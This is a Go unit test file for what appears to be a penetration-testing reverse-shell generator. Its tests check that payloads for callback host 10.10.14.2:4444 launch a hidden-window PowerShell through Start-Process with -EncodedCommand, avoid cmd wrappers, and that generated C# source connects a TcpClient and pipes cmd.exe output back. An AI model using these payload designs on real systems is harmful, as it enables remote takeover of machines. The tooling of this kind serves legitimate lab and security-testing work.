package internal

import (
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

func TestGeneratePowerShellDetachedUsesStartProcess(t *testing.T) {
	gen := NewReverseShellGenerator("10.10.14.2", 4444)
	payload := gen.GeneratePowerShellDetached()

	checks := []string{
		"Start-Process powershell",
		"-WindowStyle Hidden",
		"-ArgumentList @(",
		"-EncodedCommand",
		"| Out-Null",
	}

	for _, check := range checks {
		if !strings.Contains(payload, check) {
			t.Fatalf("expected detached payload to contain %q, got: %s", check, payload)
		}
	}
	if strings.Contains(payload, "cmd /c powershell -e") || strings.Contains(payload, "cmd /c start") {
		t.Fatalf("expected detached payload to avoid cmd launcher wrappers, got: %s", payload)
	}
}

func TestGenerateCSharpSourceContainsConnectionAndProcessLoop(t *testing.T) {
	gen := NewReverseShellGenerator("10.10.14.2", 4444)
	src := gen.GenerateCSharpSource()
	checks := []string{
		`new TcpClient("10.10.14.2", 4444)`,
		`FileName = "cmd.exe"`,
		`OutputDataReceived`,
		`BeginOutputReadLine()`,
	}
	for _, check := range checks {
		if !strings.Contains(src, check) {
			t.Fatalf("expected C# source to contain %q, got: %s", check, src)
		}
	}
}

func TestParseRevArgs(t *testing.T) {
	tests := []struct {
		name    string
		args    []string
		mode    string
		target  string
		wantErr bool
	}{
		{name: "default", args: nil, mode: "default"},
		{name: "csharp print", args: []string{"csharp"}, mode: "csharp"},
		{name: "csharp compile", args: []string{"csharp", "shell.exe"}, mode: "csharp", target: "shell.exe"},
		{name: "unknown subcommand", args: []string{"10.10.10.10"}, wantErr: true},
		{name: "too many csharp args", args: []string{"csharp", "a.exe", "extra"}, wantErr: true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			mode, target, err := parseRevArgs(tt.args)
			if tt.wantErr {
				if err == nil {
					t.Fatal("expected error")
				}
				return
			}
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if mode != tt.mode || target != tt.target {
				t.Fatalf("expected (%q,%q), got (%q,%q)", tt.mode, tt.target, mode, target)
			}
		})
	}
}

func TestCompileCSharpSourceSkipsOrBuilds(t *testing.T) {
	if _, err := exec.LookPath("mcs"); err != nil {
		t.Skip("mcs not installed")
	}
	tmp := t.TempDir()
	output := filepath.Join(tmp, "hello.exe")
	source := `using System; class Program { static void Main() { Console.WriteLine("hi"); } }`
	if err := compileCSharpSource(source, output); err != nil {
		t.Fatalf("compile failed: %v", err)
	}
}
